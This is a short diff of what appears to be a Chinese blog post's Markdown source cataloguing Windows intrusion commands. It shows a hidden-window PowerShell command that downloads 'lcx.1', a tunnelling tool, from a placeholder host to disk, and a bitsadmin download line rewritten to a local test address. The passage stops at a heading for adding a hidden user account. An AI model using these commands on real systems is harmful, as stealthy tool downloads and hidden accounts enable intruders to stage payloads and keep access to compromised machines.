@@ -17,7 +17,7 @@ categories: 技术交流
 powershell -w hidden -c (new-object System.Net.WebClient).Downloadfile('http://www.xxx.com/lcx.1','d:\\3.txt')
 ```
 ```bash
-bitsadmin /transfer myDownLoadJob /download /priority normal "http://www.xxx.com/1.zip" "c:\1.zip"
+bitsadmin /rawreturn /transfer getfile http://127.0.0.1:8080/test.zip F:\123.zip
 ```
 添加隐藏账号：
 ```bash
